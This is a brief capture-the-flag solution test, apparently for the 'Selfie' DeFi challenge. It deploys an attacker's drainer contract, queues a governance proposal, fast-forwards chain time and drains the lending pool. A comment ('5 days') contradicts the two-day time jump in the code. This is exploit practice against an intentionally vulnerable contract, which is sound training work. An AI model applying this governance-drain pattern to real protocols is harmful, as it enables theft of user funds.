...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        const SelfiePoolDrainerFactory = await ethers.getContractFactory('SelfiePoolDrainer', attacker);
        this.selfiePoolDrainer = await SelfiePoolDrainerFactory.deploy(
            this.governance.address,
            this.pool.address,
            this.token.address
        );

        await this.selfiePoolDrainer.queueDrainProposal();

        await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]); // 5 days
        await this.selfiePoolDrainer.drain();
    });
